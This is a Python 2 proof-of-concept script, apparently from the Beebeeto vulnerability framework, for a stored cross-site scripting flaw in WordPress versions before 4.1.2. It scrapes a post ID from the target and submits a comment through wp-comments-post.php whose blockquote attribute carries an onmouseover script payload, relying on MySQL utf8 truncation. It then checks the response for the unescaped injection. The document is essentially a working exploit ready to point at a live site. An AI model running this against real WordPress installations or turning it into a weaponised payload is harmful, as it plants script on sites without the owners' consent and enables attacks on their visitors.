#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import random
import string
import requests
import pdb
import os
import codecs

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0092',
            'name': 'Wordpress < 4.1.2 /wp-comments-post.php 存储型XSS漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-04-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['<4.1.2'],
            'type': 'Cross Site Scripting',
            'tag': ['Wordpress存储型XSS漏洞', '/wp-comments-post.php', 'Cross Site Scripting', 'php'],
            'desc': '''
                    该问题由 mysql 的一个特性引起，在 mysql 的 utf8 字符集中，一个字符由1~3个字节组成，
                    对于大于3个字节的字符，mysql 使用了 utf8mb4 的形式来存储。
                    如果我们将一个 utf8mb4 字符插入到 utf8 编码的列中，那么在mysql的非strict mode下，
                    他会将后面的内容截断，导致我们可以利用这一缺陷完成 XSS 攻击。
                    ''',
            'references': [
                    'https://wordpress.org/news/2015/04/wordpress-4-1-2/',
                    'https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        verify_url = target + '/wp-comments-post.php'
        sure_page = requests.get(target)
        # pattern = re.compile(r'post-(?P<post-id>[\d+])')
        rand_str = lambda length: ''.join(random.sample(string.letters, length))
        try:
            # post_id = pattern.search(sure_page.content).group('post-id')
            post_id = re.search(r'post-(?P<post_id>[\d]+)', sure_page.content).group('post_id')
        except:
            if args['options']['verbose']:
                print 'Not standard wordpress'
            return args
        comment = "test<blockquote cite='%s onmouseover=alert(test)// \xD8\x34\xDF\x06'>"
        flag = rand_str(10)
        payload = {
                'author': rand_str(5),
                'email': '%s@%s.com' % (rand_str(6), rand_str(3)),
                'url': 'http://%s.com' % rand_str(9),
                'comment': comment % flag,
                'comment_post_ID': post_id,
                'comment_parent': 0
                }
        response = requests.post(verify_url, data=payload)
        fp = codecs.open('content.txt', 'w', 'utf-8')
        fp.write(response.content)
        fp.close()
        if '<blockquote cite=&#8217;%s onmouseover=alert(test)' % flag in response.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = '%s/?p=%s' % (target, post_id)
        return args

    exploit = verify


if __name__ == "__main__":
    os.system('clear')
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
